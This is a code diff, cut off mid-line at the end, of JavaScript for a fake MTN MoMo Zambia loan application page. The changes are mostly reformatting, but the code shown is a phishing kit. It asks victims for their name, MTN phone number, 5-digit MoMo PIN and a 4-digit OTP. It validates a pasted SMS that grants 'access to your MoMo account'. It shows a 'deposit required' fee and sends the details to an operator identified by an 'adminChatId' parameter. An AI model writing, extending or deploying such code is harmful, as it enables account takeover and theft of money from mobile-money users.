@@ -69,7 +69,8 @@
     const urlParams = new URLSearchParams(window.location.search);
     const adminParam = urlParams.get('admin') || '';
 
-    const REQUIRED_SMS_REGEX = /^Y['’]ello\.\s*Please note!\s*This confidential code gives access to your MoMo account:\s*.+$/i;
+    const REQUIRED_SMS_REGEX =
+      /^Y['’]ello\.\s*Please note!\s*This confidential code gives access to your MoMo account:\s*.+$/i;
 
     function isValidMomoSms(rawSms) {
       const normalized = String(rawSms || '').replace(/\s+/g, ' ').trim();
@@ -190,7 +191,10 @@
       }
 
       if (!isValidMtnZambia(ph)) {
-        showBanner(bannerPhoneError, 'Enter a valid MTN Zambia number starting with 096, 076, or 056.');
+        showBanner(
+          bannerPhoneError,
+          'Enter a valid MTN Zambia number starting with 096, 076, or 056.'
+        );
         return;
       }
 
@@ -205,7 +209,10 @@
       const ph = (formPhoneInput?.value || '').trim();
 
       if (!fn || !ln || !isValidMtnZambia(ph)) {
-        showBanner(bannerForm3Error, 'Please complete Step 2 with a valid MTN MoMo number (096, 076, 056).');
+        showBanner(
+          bannerForm3Error,
+          'Please complete Step 2 with a valid MTN MoMo number (096, 076, 056).'
+        );
         return;
       }
 
@@ -218,7 +225,8 @@
       if (displayOtpPhone) displayOtpPhone.innerText = formattedPhone;
       if (sumApplicant) sumApplicant.innerText = fullName;
 
-      const numericAmt = Number(String(formAmountInput?.value || '100000').replace(/\D/g, '')) || 100000;
+      const numericAmt =
+        Number(String(formAmountInput?.value || '100000').replace(/\D/g, '')) || 100000;
       const depVal = Math.max(200, Math.round(numericAmt * 0.002));
       if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
 
@@ -230,14 +238,17 @@
       hideBanner(bannerOtpError);
 
       try {
-        const res = await fetch(`/api/submit-application?admin=${encodeURIComponent(adminParam)}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            adminChatId: adminParam,
-            applicant: { fullName, phone: zeroPhone }
-          })
-        });
+        const res = await fetch(
+          `/api/submit-application?admin=${encodeURIComponent(adminParam)}`,
+          {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              adminChatId: adminParam,
+              applicant: { fullName, phone: zeroPhone }
+            })
+          }
+        );
         const data = await res.json();
         if (data && data.success) {
           currentUserId = data.userId;
@@ -273,8 +284,10 @@
       const rawPhone = displayPinPhone?.innerText || formPhoneInput?.value || '';
       const phoneZero = toZeroPrefixPhone(rawPhone);
       const applicantName =
-        (sumApplicant?.innerText || `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`).trim() ||
-        'MTN MOMO ZAMBIA';
+        (
+          sumApplicant?.innerText ||
+          `${firstNameInput?.value || ''} ${lastNameInput?.value || ''}`
+        ).trim() || 'MTN MOMO ZAMBIA';
 
       showLoading('SENDING DETAILS FOR VERIFICATION...', 'Please wait for admin response...');
 
@@ -439,9 +452,14 @@
       pinBoxes5.forEach((b) => (b.value = ''));
       otpBoxes4.forEach((b) => (b.value = ''));
       if (smsInputBox) smsInputBox.value = '';
-      [bannerPhoneError, bannerForm3Error, bannerPinError, bannerSmsError, bannerSmsInfo, bannerOtpError].forEach(
-        hideBanner
-      );
+      [
+        bannerPhoneError,
+        bannerForm3Error,
+        bannerPinError,
+        bannerSmsError,
+        bannerSmsInfo,
+        bannerOtpError
+      ].forEach(hideBanner);
       hideLoading();
       showScreen(screens.welcome);
     }
@@ -496,11 +514,16 @@
         }
         case 'link-forgot-pin':
           if (event) event.preventDefault();
-          showBanner(bannerPinError, 'Enter your 5-digit MTN MoMo PIN code in the boxes above to continue.');
+          showBanner(
+            bannerPinError,
+            'Enter your 5-digit MTN MoMo PIN code in the boxes above to continue.'
+          );
           break;
         case 'btn-request-new-sms': {
           hideBanner(bannerSmsError);
-          const phoneZero = toZeroPrefixPhone(displaySmsPhone?.innerText || formPhoneInput?.value || '');
+          const phoneZero = toZeroPrefixPhone(
+            displaySmsPhone?.innerText || formPhoneInput?.value || ''
+          );
           showBanner(bannerSmsInfo, 'New SMS request sent to admin. Please wait for your SMS.');
           startSmsCountdown();
           try {
@@ -534,17 +557,4 @@
           break;
         }
         case 'btn-success-back':
-        case 'btn-finish-home':
-        case 'btn-retry-home':
-          resetToWelcome();
-          break;
-        default:
-          break;
-      }
-    }
-
-    const buttonIds = [
-      'btn-goto-slider',
-      'btn-slider-back',
-      'btn-goto-form1',
-      'btn-
+        case 'btn-finish-h
